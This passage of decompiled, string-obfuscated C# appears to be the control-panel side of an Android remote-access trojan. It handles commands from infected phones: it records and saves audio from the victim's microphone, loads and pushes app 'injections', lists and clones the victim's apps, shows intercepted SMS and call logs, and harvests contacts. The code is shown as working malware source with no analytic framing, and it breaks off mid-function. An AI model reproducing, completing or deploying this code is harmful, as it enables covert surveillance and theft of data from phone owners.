						if (CS_0024_003C_003E8__locals525._0024VB_0024Local_micform == null)
						{
							Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
							dictionary4.Add(EXGuarder._75106764, EXGuarder._793F5224);
							dictionary4.Add(EXGuarder._6F070567, EXGuarder._051F4D2A);
							Dictionary<string, object> chatData6 = dictionary4;
							commands(chatData6, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							if (CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.isRecording)
							{
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.isRecording = false;
								string text17 = CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.Btcli.userfolder + EXGuarder._0E3E0C6A;
								if (!Directory.Exists(text17))
								{
									Directory.CreateDirectory(text17);
								}
								string text18 = DateTime.Now.ToString(EXGuarder._4A2C400C);
								string outputPath = text17 + EXGuarder._1D3A166B + text18 + EXGuarder._2E340110;
								codes.SaveWavFile(CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.audioParts, outputPath);
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									BTAlerter.Success(BTConst.recosavedstr);
								}));
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.audioParts.Clear();
								Process.Start(text17);
							}
						}
						else
						{
							string s6 = dictionary3[EXGuarder._553E044A].ToString();
							byte[] array6 = Convert.FromBase64String(s6);
							CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.visualizer.Play(array6);
							if (!CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.mictoolbox.Enabled)
							{
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.mictoolbox.Enabled = true;
								}));
							}
							if (Operators.CompareString(CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.recordbtn.TagString, EXGuarder._491F0527, TextCompare: false) == 0)
							{
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.isRecording = true;
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.audioParts.Add(array6);
							}
							else if (Operators.CompareString(CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.recordbtn.TagString, EXGuarder._25676E1D, TextCompare: false) == 0 && CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.isRecording)
							{
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.isRecording = false;
								string text19 = CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.Btcli.userfolder + EXGuarder._0E3E0C6A;
								if (!Directory.Exists(text19))
								{
									Directory.CreateDirectory(text19);
								}
								string text20 = DateTime.Now.ToString(EXGuarder._4A2C400C);
								string outputPath2 = text19 + EXGuarder._1D3A166B + text20 + EXGuarder._2E340110;
								codes.SaveWavFile(CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.audioParts, outputPath2);
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									BTAlerter.Success(BTConst.recosavedstr);
								}));
								CS_0024_003C_003E8__locals525._0024VB_0024Local_micform.audioParts.Clear();
								Process.Start(text19);
							}
						}
						return;
					}
					catch (Exception ex43)
					{
						ProjectData.SetProjectError(ex43);
						Exception ex44 = ex43;
						Debuger.Log_e(EXGuarder._71795241, codes.EXtoString(ex44));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.jectscom, TextCompare: false) == 0)
				{
					try
					{
						string left13 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left13, EXGuarder._445F2207, TextCompare: false) == 0)
						{
							Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
							dictionary4.Add(EXGuarder._75106764, BTConst.loadjects);
							dictionary4.Add(EXGuarder._1E5B0C26, MainForm.Allinjections);
							Dictionary<string, object> chatData7 = dictionary4;
							commands(chatData7, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
						}
						else if (Operators.CompareString(left13, EXGuarder._3E505264, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D20 arg15 = default(_Closure_0024__15_002D20);
							_Closure_0024__15_002D20 CS_0024_003C_003E8__locals528 = new _Closure_0024__15_002D20(arg15);
							CS_0024_003C_003E8__locals528._0024VB_0024NonLocal__0024VB_0024Closure_16 = closure_0024__15_002D2;
							CS_0024_003C_003E8__locals528._0024VB_0024Local_neededzips = dictionary3[EXGuarder._36191847].ToString();
							Thread thread = new Thread([SpecialName] () =>
							{
								sendjects(CS_0024_003C_003E8__locals528._0024VB_0024Local_neededzips, CS_0024_003C_003E8__locals528._0024VB_0024NonLocal__0024VB_0024Closure_16._0024VB_0024Local_mobid, CS_0024_003C_003E8__locals528._0024VB_0024NonLocal__0024VB_0024Closure_16._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							});
							thread.IsBackground = true;
							thread.Start();
						}
						return;
					}
					catch (Exception ex45)
					{
						ProjectData.SetProjectError(ex45);
						Exception ex46 = ex45;
						Debuger.Log_e(EXGuarder._09186441, codes.EXtoString(ex46));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Clonecom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D22 arg7 = default(_Closure_0024__15_002D22);
						_Closure_0024__15_002D22 closure_0024__15_002D8 = new _Closure_0024__15_002D22(arg7);
						closure_0024__15_002D8._0024VB_0024Local_handle = EXGuarder._61796D0E + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D8._0024VB_0024Local_appsform = (AppsManager)MyProject.Application.OpenForms[closure_0024__15_002D8._0024VB_0024Local_handle];
						string left14 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left14, EXGuarder._445F2207, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D23 arg16 = default(_Closure_0024__15_002D23);
							_Closure_0024__15_002D23 CS_0024_003C_003E8__locals542 = new _Closure_0024__15_002D23(arg16);
							CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17 = closure_0024__15_002D8;
							CS_0024_003C_003E8__locals542._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform == null)
							{
								if (CS_0024_003C_003E8__locals542._0024VB_0024Local_classclient == null)
								{
									return;
								}
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform = new AppsManager();
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Name = CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Btcli = CS_0024_003C_003E8__locals542._0024VB_0024Local_classclient;
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Show();
								}));
							}
							string value5 = codes.FromBase64(Conversions.ToString(dictionary3[EXGuarder._08033105]));
							List<Dictionary<string, object>> list2 = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(value5);
							CS_0024_003C_003E8__locals542._0024VB_0024Local_rowsToAdd = new List<DataGridViewRow>();
							foreach (Dictionary<string, object> item3 in list2)
							{
								string text21 = item3[EXGuarder._48383423].ToString();
								string text22 = item3[EXGuarder._3D123B0D].ToString();
								string left15 = item3[EXGuarder._6761474C].ToString();
								string left16 = item3[EXGuarder._51184220].ToString();
								DataGridViewRow dataGridViewRow = new DataGridViewRow();
								dataGridViewRow.CreateCells(CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.DGV_CLONE, Resources.cloneicon, text21, text22, (Operators.CompareString(left15, EXGuarder._491F0527, TextCompare: false) == 0) ? EXGuarder._640E6F26 : EXGuarder._11505F23, (Operators.CompareString(left16, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.app_disabled : Resources.app_enabled);
								dataGridViewRow.Tag = text22;
								CS_0024_003C_003E8__locals542._0024VB_0024Local_rowsToAdd.Add(dataGridViewRow);
							}
							CS_0024_003C_003E8__locals542._0024VB_0024Local_isactivestr = dictionary3[EXGuarder._19255F54].ToString();
							CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.DGV_CLONE.Rows.Clear();
								CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.DGV_CLONE.Rows.AddRange(CS_0024_003C_003E8__locals542._0024VB_0024Local_rowsToAdd.ToArray());
								if (Operators.CompareString(CS_0024_003C_003E8__locals542._0024VB_0024Local_isactivestr, "1", TextCompare: false) == 0)
								{
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.enablebtn.Enabled = false;
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.disablebtn.Enabled = true;
								}
								else
								{
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.enablebtn.Enabled = true;
									CS_0024_003C_003E8__locals542._0024VB_0024NonLocal__0024VB_0024Closure_17._0024VB_0024Local_appsform.disablebtn.Enabled = false;
								}
							}));
						}
						return;
					}
					catch (Exception ex47)
					{
						ProjectData.SetProjectError(ex47);
						Exception ex48 = ex47;
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Appscom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D24 arg8 = default(_Closure_0024__15_002D24);
						_Closure_0024__15_002D24 closure_0024__15_002D9 = new _Closure_0024__15_002D24(arg8);
						closure_0024__15_002D9._0024VB_0024Local_handle = EXGuarder._61796D0E + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D9._0024VB_0024Local_appsform = (AppsManager)MyProject.Application.OpenForms[closure_0024__15_002D9._0024VB_0024Local_handle];
						string left17 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left17, EXGuarder._445F2207, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D25 arg17 = default(_Closure_0024__15_002D25);
							_Closure_0024__15_002D25 CS_0024_003C_003E8__locals548 = new _Closure_0024__15_002D25(arg17);
							CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18 = closure_0024__15_002D9;
							CS_0024_003C_003E8__locals548._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform == null)
							{
								if (CS_0024_003C_003E8__locals548._0024VB_0024Local_classclient == null)
								{
									return;
								}
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform = new AppsManager();
									CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.Name = CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.Btcli = CS_0024_003C_003E8__locals548._0024VB_0024Local_classclient;
									CS_0024_003C_003E8__locals548._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.Show();
								}));
							}
							string[] array7 = dictionary3[EXGuarder._08033105].ToString().Split(new string[1] { BTCommand.SPL_LINE }, StringSplitOptions.None);
							try
							{
								if (array7.Length > 0)
								{
									_Closure_0024__15_002D26 arg18 = default(_Closure_0024__15_002D26);
									_Closure_0024__15_002D26 CS_0024_003C_003E8__locals551 = new _Closure_0024__15_002D26(arg18);
									CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19 = CS_0024_003C_003E8__locals548;
									CS_0024_003C_003E8__locals551._0024VB_0024Local_rowsToAdd = new List<DataGridViewRow>();
									string[] array8 = array7;
									foreach (string text23 in array8)
									{
										try
										{
											string[] array9 = text23.ToString().Split(new string[1] { BTCommand.SPL_ARRAY }, StringSplitOptions.None);
											if (array9.Length > 1)
											{
												string text24 = array9[0];
												string text25 = array9[1];
												string text26 = array9[2];
												string text27 = array9[3];
												string text28 = array9[4];
												string left18 = EXGuarder._491F0527;
												string left19 = EXGuarder._25676E1D;
												string left20 = EXGuarder._25676E1D;
												string left21 = EXGuarder._25676E1D;
												string left22 = EXGuarder._25676E1D;
												string left23 = EXGuarder._25676E1D;
												try
												{
													if (array9.Length > 5 && array9[5] != null)
													{
														left18 = array9[5];
													}
													if (array9.Length > 6 && array9[6] != null)
													{
														left19 = array9[6];
													}
													if (array9.Length > 7 && array9[7] != null)
													{
														left20 = array9[7];
													}
													if (array9.Length > 8 && array9[8] != null)
													{
														left21 = array9[8];
													}
													if (array9.Length > 9 && array9[9] != null)
													{
														left22 = array9[9];
													}
													if (array9.Length > 10 && array9[10] != null)
													{
														left23 = array9[10];
													}
												}
												catch (Exception ex49)
												{
													ProjectData.SetProjectError(ex49);
													Exception ex50 = ex49;
													ProjectData.ClearProjectError();
												}
												Bitmap bitmap6 = ((Operators.CompareString(left18, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.app_enabled : Resources.app_disabled);
												Bitmap bitmap7 = ((Operators.CompareString(left19, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.app_locked : Resources.app_nolock);
												Bitmap bitmap8 = ((Operators.CompareString(left20, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.app_traked : Resources.app_notrak);
												Bitmap bitmap9 = ((Operators.CompareString(left21, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.ject_on : Resources.ject_off);
												Bitmap bitmap10 = ((Operators.CompareString(left22, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.blockapp_on : Resources.blocksymbol);
												Bitmap bitmap11 = ((Operators.CompareString(left23, EXGuarder._491F0527, TextCompare: false) == 0) ? Resources.favhart : Resources.favhart_off);
												DataGridViewRow dataGridViewRow2 = new DataGridViewRow();
												if (Operators.CompareString(text28, EXGuarder._705B363B, TextCompare: false) == 0)
												{
													dataGridViewRow2.CreateCells(CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0, Resources.user, text24, text25, text26, text27, bitmap6, bitmap7, bitmap8, bitmap9, bitmap10, bitmap11);
												}
												else
												{
													dataGridViewRow2.CreateCells(CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0, codes.Base64ToImage(text28), text24, text25, text26, text27, bitmap6, bitmap7, bitmap8, bitmap9, bitmap10, bitmap11);
												}
												dataGridViewRow2.Tag = text26;
												CS_0024_003C_003E8__locals551._0024VB_0024Local_rowsToAdd.Add(dataGridViewRow2);
											}
										}
										catch (Exception ex51)
										{
											ProjectData.SetProjectError(ex51);
											Exception ex52 = ex51;
											Debuger.Log_e(EXGuarder._36716703, codes.EXtoString(ex52));
											ProjectData.ClearProjectError();
										}
									}
									if (CS_0024_003C_003E8__locals551._0024VB_0024Local_rowsToAdd.Count > 0)
									{
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0.Rows.Clear();
											CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0.Rows.AddRange(CS_0024_003C_003E8__locals551._0024VB_0024Local_rowsToAdd.ToArray());
										}));
										if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
										{
											codes.SaveDGV(CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024NonLocal__0024VB_0024Closure_18._0024VB_0024Local_appsform.DGV0, CS_0024_003C_003E8__locals551._0024VB_0024NonLocal__0024VB_0024Closure_19._0024VB_0024Local_classclient.userfolder, EXGuarder._41060B02);
										}
									}
								}
								return;
							}
							catch (Exception ex53)
							{
								ProjectData.SetProjectError(ex53);
								Exception ex54 = ex53;
								Debuger.Log_e(EXGuarder._5C276633, codes.EXtoString(ex54));
								ProjectData.ClearProjectError();
								return;
							}
						}
						return;
					}
					catch (Exception ex55)
					{
						ProjectData.SetProjectError(ex55);
						Exception ex56 = ex55;
						Debuger.Log_e(EXGuarder._276D0845, codes.EXtoString(ex56));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.blkercom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D27 arg9 = default(_Closure_0024__15_002D27);
						_Closure_0024__15_002D27 closure_0024__15_002D10 = new _Closure_0024__15_002D27(arg9);
						string name4 = EXGuarder._61334162 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D10._0024VB_0024Local_blockform = (Blocker)MyProject.Application.OpenForms[name4];
						if (closure_0024__15_002D10._0024VB_0024Local_blockform != null)
						{
							string left24 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left24, EXGuarder._54505237, TextCompare: false) != 0)
							{
								if (Operators.CompareString(left24, EXGuarder._445F2207, TextCompare: false) == 0)
								{
									string s7 = dictionary3[EXGuarder._08033105].ToString();
									string left25 = dictionary3[EXGuarder._68412C38].ToString();
									if (Operators.CompareString(left25, EXGuarder._786A296B, TextCompare: false) == 0)
									{
										_Closure_0024__15_002D29 arg19 = default(_Closure_0024__15_002D29);
										_Closure_0024__15_002D29 CS_0024_003C_003E8__locals553 = new _Closure_0024__15_002D29(arg19);
										CS_0024_003C_003E8__locals553._0024VB_0024NonLocal__0024VB_0024Closure_21 = closure_0024__15_002D10;
										string[] array10 = s7.Split(EXGuarder._1B053239, ignoreEmpty: true);
										CS_0024_003C_003E8__locals553._0024VB_0024Local_rowsToAdd = new List<DataGridViewRow>();
										string[] array11 = array10;
										foreach (string text29 in array11)
										{
											string[] array12 = text29.Split('|');
											if (array12.Length >= 4)
											{
												string text30 = array12[0];
												string text31 = array12[1];
												string text32 = array12[2];
												string text33 = array12[3];
												string text34 = ((text32 != null && text32.Length > 15) ? (text32.Substring(0, 15) + EXGuarder._656A7530) : text32);
												DataGridViewRow dataGridViewRow3 = new DataGridViewRow();
												dataGridViewRow3.CreateCells(CS_0024_003C_003E8__locals553._0024VB_0024NonLocal__0024VB_0024Closure_21._0024VB_0024Local_blockform.DGV_SMS, text34, text31, text30, text33, EXGuarder._5D0D0E6F);
												dataGridViewRow3.Tag = text32;
												CS_0024_003C_003E8__locals553._0024VB_0024Local_rowsToAdd.Add(dataGridViewRow3);
											}
										}
										if (CS_0024_003C_003E8__locals553._0024VB_0024Local_rowsToAdd.Count > 0)
										{
											CS_0024_003C_003E8__locals553._0024VB_0024NonLocal__0024VB_0024Closure_21._0024VB_0024Local_blockform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												CS_0024_003C_003E8__locals553._0024VB_0024NonLocal__0024VB_0024Closure_21._0024VB_0024Local_blockform.DGV_SMS.Rows.AddRange(CS_0024_003C_003E8__locals553._0024VB_0024Local_rowsToAdd.ToArray());
											}));
											if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
											{
												BTClient clientById6 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
												if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
												{
													codes.SaveDGV(CS_0024_003C_003E8__locals553._0024VB_0024NonLocal__0024VB_0024Closure_21._0024VB_0024Local_blockform.DGV_SMS, clientById6.userfolder, EXGuarder._642A7869);
												}
											}
										}
									}
									else if (Operators.CompareString(left25, EXGuarder._54505237, TextCompare: false) == 0)
									{
										_Closure_0024__15_002D30 arg20 = default(_Closure_0024__15_002D30);
										_Closure_0024__15_002D30 CS_0024_003C_003E8__locals556 = new _Closure_0024__15_002D30(arg20);
										CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22 = closure_0024__15_002D10;
										string[] array13 = s7.Split(EXGuarder._1B053239, ignoreEmpty: true);
										CS_0024_003C_003E8__locals556._0024VB_0024Local_rowsToAdd = new List<DataGridViewRow>();
										string[] array14 = array13;
										foreach (string text35 in array14)
										{
											string[] array15 = text35.Split('|');
											if (array15.Length >= 5)
											{
												string strcall = array15[0];
												string text36 = array15[1];
												string text37 = array15[2];
												string text38 = array15[3];
												string text39 = array15[4];
												Bitmap bitmap12 = CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.getcallicon(strcall);
												DataGridViewRow dataGridViewRow4 = new DataGridViewRow();
												dataGridViewRow4.CreateCells(CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.DGVCALLS, bitmap12, text36, text37, text38, text39);
												CS_0024_003C_003E8__locals556._0024VB_0024Local_rowsToAdd.Add(dataGridViewRow4);
											}
										}
										if (CS_0024_003C_003E8__locals556._0024VB_0024Local_rowsToAdd.Count > 0)
										{
											CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.DGVCALLS.Rows.Clear();
												CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.DGVCALLS.Rows.AddRange(CS_0024_003C_003E8__locals556._0024VB_0024Local_rowsToAdd.ToArray());
											}));
											if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
											{
												BTClient clientById7 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
												if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
												{
													codes.SaveDGV(CS_0024_003C_003E8__locals556._0024VB_0024NonLocal__0024VB_0024Closure_22._0024VB_0024Local_blockform.DGVCALLS, clientById7.userfolder, EXGuarder._4051702D);
												}
											}
										}
									}
								}
							}
							else
							{
								_Closure_0024__15_002D28 arg21 = default(_Closure_0024__15_002D28);
								_Closure_0024__15_002D28 CS_0024_003C_003E8__locals564 = new _Closure_0024__15_002D28(arg21);
								CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20 = closure_0024__15_002D10;
								CS_0024_003C_003E8__locals564._0024VB_0024Local_isSmsmng = dictionary3[EXGuarder._3E647739].ToString();
								CS_0024_003C_003E8__locals564._0024VB_0024Local_isCallmng = dictionary3[EXGuarder._32181042].ToString();
								CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activesms.Checked = Operators.CompareString(CS_0024_003C_003E8__locals564._0024VB_0024Local_isSmsmng, "1", TextCompare: false) == 0;
									CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activecalls.Checked = Operators.CompareString(CS_0024_003C_003E8__locals564._0024VB_0024Local_isCallmng, "1", TextCompare: false) == 0;
									CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activesms.Enabled = !CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activesms.Checked;
									CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activecalls.Enabled = !CS_0024_003C_003E8__locals564._0024VB_0024NonLocal__0024VB_0024Closure_20._0024VB_0024Local_blockform.activecalls.Checked;
								}));
							}
						}
						return;
					}
					catch (Exception ex57)
					{
						ProjectData.SetProjectError(ex57);
						Exception ex58 = ex57;
						Debuger.Log_e(EXGuarder._545F5843, codes.EXtoString(ex58));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.chatcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D31 arg22 = default(_Closure_0024__15_002D31);
						_Closure_0024__15_002D31 CS_0024_003C_003E8__locals566 = new _Closure_0024__15_002D31(arg22);
						string name5 = EXGuarder._4C4B545D + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals566._0024VB_0024Local_chatform = (Chat)MyProject.Application.OpenForms[name5];
						if (CS_0024_003C_003E8__locals566._0024VB_0024Local_chatform != null)
						{
							CS_0024_003C_003E8__locals566._0024VB_0024Local_newmsg = dictionary3[EXGuarder._08033105].ToString();
							MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals566._0024VB_0024Local_chatform.AppendToChat(isFromClient: true, CS_0024_003C_003E8__locals566._0024VB_0024Local_newmsg);
							}));
						}
						return;
					}
					catch (Exception ex59)
					{
						ProjectData.SetProjectError(ex59);
						Exception ex60 = ex59;
						Debuger.Log_e(EXGuarder._13472C67, codes.EXtoString(ex60));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Contactscom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D32 arg10 = default(_Closure_0024__15_002D32);
						_Closure_0024__15_002D32 closure_0024__15_002D11 = new _Closure_0024__15_002D32(arg10);
						closure_0024__15_002D11._0024VB_0024Local_handle = EXGuarder._1B115676 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D11._0024VB_0024Local_contsform = (ContactsManager)MyProject.Application.OpenForms[closure_0024__15_002D11._0024VB_0024Local_handle];
						string left26 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left26, EXGuarder._445F2207, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D33 arg23 = default(_Closure_0024__15_002D33);
							_Closure_0024__15_002D33 CS_0024_003C_003E8__locals572 = new _Closure_0024__15_002D33(arg23);
							CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23 = closure_0024__15_002D11;
							CS_0024_003C_003E8__locals572._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform == null)
							{
								if (CS_0024_003C_003E8__locals572._0024VB_0024Local_classclient == null)
								{
									return;
								}
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform = new ContactsManager();
									CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.Name = CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.Btcli = CS_0024_003C_003E8__locals572._0024VB_0024Local_classclient;
									CS_0024_003C_003E8__locals572._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.Show();
								}));
							}
							string[] array16 = dictionary3[EXGuarder._08033105].ToString().Split(new string[1] { BTCommand.SPL_LINE }, StringSplitOptions.None);
							try
							{
								if (array16.Length > 0)
								{
									_Closure_0024__15_002D34 arg24 = default(_Closure_0024__15_002D34);
									_Closure_0024__15_002D34 CS_0024_003C_003E8__locals574 = new _Closure_0024__15_002D34(arg24);
									CS_0024_003C_003E8__locals574._0024VB_0024NonLocal__0024VB_0024Closure_24 = CS_0024_003C_003E8__locals572;
									CS_0024_003C_003E8__locals574._0024VB_0024Local_rowsToAdd = new List<DataGridViewRow>();
									string[] array17 = array16;
									foreach (string text40 in array17)
									{
										try
										{
											string[] array18 = text40.ToString().Split(new string[1] { BTCommand.SPL_ARRAY }, StringSplitOptions.None);
											if (array18.Length > 1)
											{
												string text41 = array18[0];
												string text42 = array18[1];
												string text43 = array18[2];
												string tag = array18[3];
												DataGridViewRow dataGridViewRow5 = new DataGridViewRow();
